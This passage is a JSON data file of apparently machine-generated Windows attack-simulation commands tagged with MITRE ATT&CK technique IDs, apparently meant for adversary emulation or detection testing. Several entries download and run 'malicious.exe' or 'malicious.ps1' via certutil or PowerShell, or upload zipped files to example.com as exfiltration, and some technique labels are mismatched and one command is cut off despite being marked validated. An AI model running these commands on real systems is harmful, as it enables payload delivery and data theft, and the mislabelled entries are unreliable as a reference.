      "expected_behavior": "Word application opens",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:29.483484",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ecd203a5-60a1-4885-86c7-feaf4f29452b",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c start winword.exe && timeout /t 5 && cmd /c start powershell.exe -Command \"Write-Host 'Phishing activity detected'\"",
      "description": "Spawns a command shell after a short delay, simulating phishing activity",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Command shell opens after a short delay",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:29.483484",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9c94c85a-a196-4a0d-b933-e45519c3e073",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('C:\\\\Windows\\\\System32\\\\cmd.exe', '/c', 'start', 'powershell.exe', '-Command', 'Write-Host \"Phishing activity detected\"')\"",
      "description": "Spawns a nested command shell, simulating phishing activity",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Nested command shell opens",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:29.483484",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0be235f7-4d2d-4816-b0d8-3afcbd1264d2",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ='))\"",
      "description": "Basic obfuscated command using base64 encoded string",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Hello world' to the console",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:30.158739",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "deac2f92-1824-4522-9ec3-2ef8162568f9",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -decode %TEMP%\\test.txt %TEMP%\\test.exe",
      "description": "Intermediate obfuscated command using certutil to decode a file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a file named test.txt in the temp directory and saves it as test.exe",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:30.158739",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f9002526-ca33-479a-add0-c2b9f7a24db1",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-Expression -Command (New-Object System.IO.StreamReader('%TEMP%\\test.txt')).ReadToEnd()\"",
      "description": "Advanced obfuscated command using Invoke-Expression to execute a script from a file",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Executes the contents of the file test.txt in the temp directory as PowerShell code",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:30.158739",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "121dcaaf-215c-4be9-961d-367f313474af",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c start cmd.exe",
      "description": "Basic process hollowing using cmd.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new cmd.exe process will be created, potentially bypassing detection",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:31.979812",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5ededc71-9a04-4f88-b68e-43c9c0f9ac11",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process cmd.exe -ArgumentList '/c', 'echo Hello World > %TEMP%\\test.txt'}\"",
      "description": "Intermediate process hollowing using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new cmd.exe process will be created, and a file will be written to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:31.979812",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cbd15c7b-b368-47d9-91a8-c828fdea22b0",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process -FilePath cmd.exe -ArgumentList '/c', 'certutil -f -decode %TEMP%\\test.txt %TEMP%\\test.exe && start %TEMP%\\test.exe'}\"",
      "description": "Advanced process hollowing using certutil and PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A new cmd.exe process will be created, a file will be decoded and executed, potentially bypassing detection",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:31.979812",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b1444203-3a78-4507-921a-ff0bdd610dfa",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ=')) > %TEMP%\\test.txt\"",
      "description": "Creates a file with obfuscated content using Base64 encoding",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.txt will be created in the temp directory with the string 'Hello world'",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:32.516398",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "432e4713-7560-4761-9e36-7cac19429035",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode %TEMP%\\test.txt %TEMP%\\test.enc",
      "description": "Obfuscates a file using certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.enc will be created in the temp directory with the encoded content of test.txt",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:32.516398",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1a9a55d8-7316-451d-944e-48cf9f8e1f38",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\test.txt -DestinationPath %TEMP%\\test.zip -Force\"",
      "description": "Compresses a file to obfuscate its contents",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A zip file named test.zip will be created in the temp directory with the compressed content of test.txt",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:32.516398",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e55fd1f7-d46e-49c7-b3b6-21da7ff78025",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::Create('https://redacted.redacted.com:443').GetResponse()\"",
      "description": "Detects potential exfiltration of data over alternative protocols via connections to a suspicious domain on port 443",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Establish a connection to the specified domain on port 443",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:34.166474",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f2a1c65b-dde2-468c-b3c8-d8d06f67701f",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f https://redacted.redacted.com:443/test.txt %TEMP%\\test.txt",
      "description": "Exfiltration of data over alternative protocols using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Download a file from the specified domain on port 443 and save it to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:34.166474",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "97c60ecc-b28d-4849-95d6-87d9ac0d35de",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri https://redacted.redacted.com:443 -OutFile %TEMP%\\exfil.txt -ErrorAction SilentlyContinue\"",
      "description": "Exfiltration of data over alternative protocols using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Download a file from the specified domain on port 443 and save it to the temp directory, ignoring any errors that may occur",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:34.166474",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ffa661dd-eb0c-4b5c-bafa-b9c2fb3fb31a",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Spearphishing Attachment Test'\"",
      "description": "Basic: Detects Office processes spawning command shells via PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Writes 'Spearphishing Attachment Test' to the console",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:34.879072",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7b7921d1-57e1-41e1-98c1-b15aa4c59ddf",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"certutil -decode %TEMP%\\test.txt %TEMP%\\test.exe && %TEMP%\\test.exe\"",
      "description": "Intermediate: Detects Office processes spawning command shells via certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a test file and executes it",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:34.879072",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f5a7a7bb-bced-4754-9a7d-93b45f561723",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('cmd.exe', '/c', 'whoami.exe')\"",
      "description": "Advanced: Detects Office processes spawning command shells via PowerShell and System.Diagnostics.Process",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes whoami.exe via cmd.exe",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:34.879072",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "384e5393-f628-4cd3-bd90-92a24c93416d",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "dir C:\\Windows\\System32",
      "description": "Basic file and directory discovery using the dir command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files and directories in the C:\\Windows\\System32 directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:35.484927",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f1500b12-3ffc-4efd-a11c-e6667f065869",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-ChildItem -Path C:\\Windows\\System32 -Filter *.dll\"",
      "description": "Intermediate file and directory discovery using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists DLL files in the C:\\Windows\\System32 directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:35.484927",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f0104d4f-e222-453c-a5b4-e6ffd4ee1ef8",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$files = Get-ChildItem -Path C:\\Windows\\System32; foreach ($file in $files) { Write-Host $file.Name }\"",
      "description": "Advanced file and directory discovery using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files in the C:\\Windows\\System32 directory using a foreach loop",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:35.484927",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7c1d80dc-88cc-4e0a-8996-c6bd9fb14879",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "systeminfo",
      "description": "System information discovery via systeminfo command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information including OS version, hardware, and hotfixes",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:36.051867",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "83425f0c-298b-4e7e-b521-4e21d1fc9f71",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_OperatingSystem\"",
      "description": "System information discovery via WMI",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information including OS version and build number",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:36.052872",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0a03f133-d45c-46c1-8dee-eed3bf2677a7",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic os get /value",
      "description": "System information discovery via wmic",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information including OS version, build number, and service pack level",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:36.052872",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "430f6a82-000d-4a83-ab49-2179e8b0966a",
      "ttp_id": "unknown",
      "technique_id": "T1059.005",
      "technique_name": "Execution of VBA Macro Code",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('winword.exe', '/mHelloWorld')\"",
      "description": "Execute VBA macro code via winword.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Winword.exe will execute the VBA macro code and display a message box with 'Hello World'.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:38.181085",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "972aa195-0d4a-4f14-ab3e-2319eec68d53",
      "ttp_id": "unknown",
      "technique_id": "T1059.005",
      "technique_name": "Execution of VBA Macro Code",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName Microsoft.Office.Interop.Excel; $excel = New-Object -ComObject Excel.Application; $excel.Visible = $true; $workbook = $excel.Workbooks.Add(); $sheet = $workbook.Sheets.Item(1); $sheet.Cells.Item(1,1) = 'Hello World'; $workbook.SaveAs('%TEMP%\\example.xlsx')\"",
      "description": "Create an Excel spreadsheet with VBA macro code",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "An Excel spreadsheet will be created with a VBA macro that displays 'Hello World' in cell A1.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:38.181085",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "85967e1d-3edd-48ca-9b4c-39785a514340",
      "ttp_id": "unknown",
      "technique_id": "T1059.005",
      "technique_name": "Execution of VBA Macro Code",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$vbaCode = 'Sub HelloWorld(): MsgBox \"Hello World\" : End Sub'; $vbaCode | Out-File -FilePath '%TEMP%\\example.vba'; $excel = New-Object -ComObject Excel.Application; $excel.Visible = $true; $workbook = $excel.Workbooks.Add(); $workbook.VBProject.VBComponents.Import('%TEMP%\\example.vba')\"",
      "description": "Import VBA macro code into an Excel spreadsheet",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "An Excel spreadsheet will be created with a VBA macro that displays 'Hello World' when executed.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:38.181085",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f2da7363-72c9-449e-b86e-fe6f583f2f5d",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "systeminfo",
      "description": "Basic system information discovery using systeminfo command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information, including OS version, hardware, and network configuration",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:38.833140",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2dad3e16-25e6-4fe7-9d68-6daf9604158d",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_ComputerSystem\"",
      "description": "Intermediate system information discovery using PowerShell and WMI",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information, including computer name, domain, and workgroup",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:38.833140",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e29149ae-ad13-4e3b-9469-7ec8f871fcca",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic cpu get /value",
      "description": "Advanced system information discovery using WMIC",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays CPU information, including device ID, manufacturer, and name",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:38.833140",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a8d8b79c-a00b-4a1f-95c8-698191295ae5",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath '%TEMP%\\test.zip' -Force\"",
      "description": "Basic example of compressing a file using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive of a test file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:39.817317",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "68baebb5-138c-4984-bb4a-ce9a5c716aac",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '%TEMP%\\test.txt' -Value 'This is a test file' -Force; Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath '%TEMP%\\test.zip' -Force\"",
      "description": "Intermediate example of creating and compressing a file using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file and then compresses it into a zip archive in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:39.817827",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "fb08caf6-06ac-47da-b87d-09b8d95c3619",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.IO.Directory]::GetFiles('%TEMP%'); Compress-Archive -Path '%TEMP%\\*' -DestinationPath '%TEMP%\\test.zip' -Force -ErrorAction SilentlyContinue\"",
      "description": "Advanced example of compressing all files in the temp directory using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Compresses all files in the temp directory into a zip archive, ignoring any errors that may occur",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:39.817827",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cee565e4-d40f-458d-a28b-27337ebd6240",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath '%TEMP%\\test.zip' -Force; Invoke-WebRequest -Uri 'http://example.com/upload' -Method Post -InFile '%TEMP%\\test.zip' -ErrorAction SilentlyContinue\"",
      "description": "Exfiltrate data using Compress-Archive and Invoke-WebRequest",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Upload a zip file to a remote server",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:40.406545",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "12b42b77-f1fa-4c11-a81a-29e5494b0906",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/upload file://%TEMP%\\test.txt",
      "description": "Exfiltrate data using certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Upload a file to a remote server",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:40.406545",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4a387320-6749-4037-9582-22b73dc326ef",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '%TEMP%\\test.txt' -Value 'Test data'; powershell -Command \\",
      "description": "Exfiltrate data using Set-Content and encoded command",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Upload a file to a remote server",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:40.406545",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "41d566a6-2978-4190-bc04-8ebe113e16c8",
      "ttp_id": "unknown",
      "technique_id": "T1074",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\\\Windows\\\\\\\\Temp\\\\\\\\test.txt -DestinationPath C:\\\\\\Windows\\\\\\\\Temp\\\\\\\\test.zip -Force\"",
      "description": "Archive collected data using Compress-Archive cmdlet",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a zip archive of a test file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:40.976921",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c0462de0-c05b-4644-b8e6-1e271aedc84d",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.exe C:\\\\\\Windows\\\\\\\\Temp\\\\\\\\malicious.exe && C:\\\\\\Windows\\\\\\\\Temp\\\\\\\\malicious.exe",
      "description": "Download and execute a file using certutil and legacy binaries",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file from a URL and executes it",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:40.976921",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1a22fed3-c241-45f0-aeaa-9bdb91596142",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebClient]::new().DownloadFile('http://example.com/malicious.exe', 'C:\\\\\\Windows\\\\\\\\Temp\\\\\\\\malicious.exe')\"",
      "description": "Download a file using WebClient",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file from a URL to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:40.976921",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a43e5701-cec1-430c-a10f-a1c9838797fb",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Downloads a malicious executable using certutil and executes it",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads and executes a malicious executable",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:41.537055",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9c4bf948-4128-4850-9b2c-6f621a1c81cf",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malicious.ps1 -OutFile %TEMP%\\malicious.ps1; Invoke-Command -ScriptBlock {& %TEMP%\\malicious.ps1}\"",
      "description": "Downloads a malicious PowerShell script using Invoke-WebRequest and executes it",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads and executes a malicious PowerShell script",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:41.537055",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c757d98b-a7cf-4b51-a814-834b95d3b850",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"regsvr32 /s /n /u /i:%TEMP%\\malicious.sct scrobj.dll\"",
      "description": "Registers a malicious COM scriptlet using regsvr32",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Registers a malicious COM scriptlet",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:41.537055",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4dac6b1a-5716-4cd5-92dc-d8845298d7e0",
      "ttp_id": "unknown",
      "technique_id": "T1053",
      "technique_name": "Scheduled Task",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /create /tn \"Test Task\" /tr \"cmd /c echo Hello World > %TEMP%\\test.txt\" /sc daily",
      "description": "Create a scheduled task to execute a command daily",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "A scheduled task is created and executed daily, writing to a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:42.176329",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6dac9801-deec-4046-bc06-55a4760c8a8b",
      "ttp_id": "unknown",
      "technique_id": "T1053",
      "technique_name": "Scheduled Task",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"schtasks /create /tn 'Test Task' /tr 'cmd /c echo Hello World > %TEMP%\\test.txt' /sc daily\"",
      "description": "Create a scheduled task to execute a command daily using PowerShell",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "A scheduled task is created and executed daily, writing to a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:42.176329",
